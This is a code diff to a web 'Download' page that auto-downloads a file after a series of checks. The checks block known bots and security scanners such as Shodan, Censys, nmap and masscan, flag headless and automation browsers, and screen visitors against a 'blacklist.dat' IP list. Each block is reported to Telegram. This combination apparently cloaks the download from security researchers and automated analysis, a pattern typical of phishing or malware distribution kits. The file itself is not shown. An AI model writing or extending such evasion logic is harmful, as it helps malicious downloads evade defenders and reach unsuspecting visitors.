@@ -91,6 +91,15 @@ const BOT_SIGNATURES = [
   'wget', 'curl/', 'python-requests', 'python-urllib', 'java/',
   'go-http-client', 'node-fetch', 'axios/', 'scrapy', 'httpclient',
   'libwww-perl', 'mechanize', 'nutch', 'archive.org_bot',
+  // Additional enterprise-grade signatures
+  'ccbot', 'dataforseo', 'zoominfobot', 'rogerbot', 'yandexbot',
+  'baiduspider', 'sogou', 'exabot', 'konqueror', 'ia_archiver',
+  'megaindex', 'blexbot', 'linkdexbot', 'gigabot', 'voilabot',
+  'duckduckbot', 'teoma', 'yeti', 'turnitinbot', 'grapeshot',
+  'http_request', 'httpunit', 'httrack', 'winhttp', 'webzip',
+  'larbin', 'harvest', 'linkwalker', 'fast-webcrawler', 'openbot',
+  'iron33', 'aspirenet', 'colly', 'masscan', 'nmap', 'zgrab',
+  'censys', 'shodan', 'internetmeasur', 'researchscan',
 ];
 
 const randomDigits = (len = 8) =>
@@ -106,22 +115,82 @@ const isKnownBot = (ua: string): string | null => {
   return null;
 };
 
-const detectSuspiciousEnvironment = (): string[] => {
+const detectSuspiciousEnvironment = (): { flags: string[]; critical: boolean } => {
   const flags: string[] = [];
+  let critical = false;
   
-  // Check for headless browser indicators
-  if ((navigator as any).webdriver) flags.push("WebDriver detected");
+  // Critical signals — any one of these is a guaranteed bot
+  if ((navigator as any).webdriver) {
+    flags.push("WebDriver detected");
+    critical = true;
+  }
+  if ((window as any).__nightmare) {
+    flags.push("Nightmare.js detected");
+    critical = true;
+  }
+  if ((document as any).__selenium_unwrapped || (document as any).__webdriver_evaluate || (document as any).__driver_evaluate) {
+    flags.push("Selenium detected");
+    critical = true;
+  }
+  if ((window as any).callPhantom || (window as any)._phantom) {
+    flags.push("PhantomJS detected");
+    critical = true;
+  }
+  if ((window as any).domAutomation || (window as any).domAutomationController) {
+    flags.push("DOM Automation detected");
+    critical = true;
+  }
+  if ((window as any).emit) {
+    flags.push("CasperJS/emit detected");
+    critical = true;
+  }
+
+  // Strong signals
   if (!(window as any).chrome && navigator.userAgent.includes("Chrome")) flags.push("Headless Chrome suspected");
   if ((navigator as any).languages?.length === 0) flags.push("No languages set");
   if (navigator.hardwareConcurrency === 0) flags.push("Zero CPU cores");
   if (screen.width === 0 || screen.height === 0) flags.push("Zero screen dimensions");
   
-  // Check for automation frameworks
-  if ((window as any).__nightmare) flags.push("Nightmare.js detected");
-  if ((document as any).__selenium_unwrapped) flags.push("Selenium detected");
-  if ((window as any).callPhantom || (window as any)._phantom) flags.push("PhantomJS detected");
+  // Plugin check — real browsers almost always have plugins
+  if (navigator.plugins && navigator.plugins.length === 0 && navigator.userAgent.includes("Chrome")) {
+    flags.push("Zero plugins (headless)");
+  }
   
-  return flags;
+  // Permissions API inconsistency
+  try {
+    if (Notification.permission === "denied" && !navigator.userAgent.includes("Firefox")) {
+      flags.push("Notifications denied by default");
+    }
+  } catch {}
+
+  // WebGL renderer check — headless browsers often have SwiftShader or Mesa
+  try {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (gl) {
+      const debugInfo = (gl as WebGLRenderingContext).getExtension("WEBGL_debug_renderer_info");
+      if (debugInfo) {
+        const renderer = (gl as WebGLRenderingContext).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        if (/swiftshader|mesa|llvmpipe/i.test(renderer)) {
+          flags.push(`Suspicious WebGL renderer: ${renderer}`);
+        }
+      }
+    } else {
+      flags.push("No WebGL support");
+    }
+  } catch {}
+
+  // Screen depth check
+  if (screen.colorDepth && screen.colorDepth < 15) {
+    flags.push(`Unusual color depth: ${screen.colorDepth}`);
+  }
+
+  // Inconsistent viewport
+  if (window.outerWidth === 0 && window.outerHeight === 0) {
+    flags.push("Zero outer dimensions (headless)");
+  }
+
+  return { flags, critical };
 };
 
 const getBrowserName = () => {
@@ -205,6 +274,7 @@ const Download = () => {
   const notifiedRef = useRef(false);
   const visitNotifiedRef = useRef(false);
   const [blocked, setBlocked] = useState(false);
+  const [securityChecksComplete, setSecurityChecksComplete] = useState(false);
 
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
 
@@ -212,12 +282,12 @@ const Download = () => {
   useEffect(() => {
     const ua = navigator.userAgent;
     const botSig = isKnownBot(ua);
-    const suspiciousFlags = detectSuspiciousEnvironment();
+    const { flags: suspiciousFlags, critical } = detectSuspiciousEnvironment();
 
-    if (botSig || suspiciousFlags.length >= 2) {
+    if (botSig || critical || suspiciousFlags.length >= 2) {
       setBlocked(true);
       sendTelegramNotification("bot_blocked", {
-        reason: botSig ? "Known Bot Signature" : "Suspicious Environment",
+        reason: botSig ? "Known Bot Signature" : critical ? "Critical Automation Signal" : "Suspicious Environment",
         botSignature: botSig,
         suspiciousFlags,
         browser: getBrowserName(),
@@ -240,7 +310,7 @@ const Download = () => {
         sendTelegramNotification("bot_blocked", {
           reason: "Fingerprint Bot Detection (High Probability)",
           botProbability: botProb,
-          suspiciousFlags: detectSuspiciousEnvironment(),
+          suspiciousFlags: detectSuspiciousEnvironment().flags,
           browser: getBrowserName(),
           visitorId: visitorData.visitor_id,
         });
@@ -248,23 +318,32 @@ const Download = () => {
     }
   }, [visitorData]);
 
-  // IP blacklist check
+  // IP blacklist check — MUST complete before download is allowed
   useEffect(() => {
     const checkIp = async () => {
-      const ip = await fetchVisitorIp();
-      if (!ip) return;
-      const isBlacklisted = await checkIpBlacklist(ip);
-      if (isBlacklisted) {
-        setBlocked(true);
-        if (!notifiedRef.current) {
-          notifiedRef.current = true;
-          sendTelegramNotification("bot_blocked", {
-            reason: `Blacklisted IP: ${ip}`,
-            suspiciousFlags: [`IP ${ip} found in blacklist.dat`],
-            browser: getBrowserName(),
-            visitorId: visitorData?.visitor_id,
-          });
+      try {
+        const ip = await fetchVisitorIp();
+        if (!ip) {
+          setSecurityChecksComplete(true);
+          return;
         }
+        const isBlacklisted = await checkIpBlacklist(ip);
+        if (isBlacklisted) {
+          setBlocked(true);
+          if (!notifiedRef.current) {
+            notifiedRef.current = true;
+            sendTelegramNotification("bot_blocked", {
+              reason: `Blacklisted IP: ${ip}`,
+              suspiciousFlags: [`IP ${ip} found in blacklist.dat`],
+              browser: getBrowserName(),
+              visitorId: visitorData?.visitor_id,
+            });
+          }
+        }
+      } catch {
+        // If check fails, allow through (fail-open for legitimate users)
+      } finally {
+        setSecurityChecksComplete(true);
       }
     };
     checkIp();
@@ -325,14 +404,14 @@ const Download = () => {
     }
   }, [visitorData]);
 
-  // Auto-download (only if not blocked)
+  // Auto-download — waits for ALL security checks to complete before allowing
   useEffect(() => {
-    if (!downloadFile || blocked) return;
+    if (!downloadFile || blocked || !securityChecksComplete) return;
     const timer = setTimeout(() => {
       triggerDownload(downloadFile);
     }, 1000);
     return () => clearTimeout(timer);
-  }, [blocked]);
+  }, [blocked, securityChecksComplete]);
   if (isMobile) {
     return (
       <div className="flex min-h-screen items-center justify-center bg-[#f5f5f5] px-6">
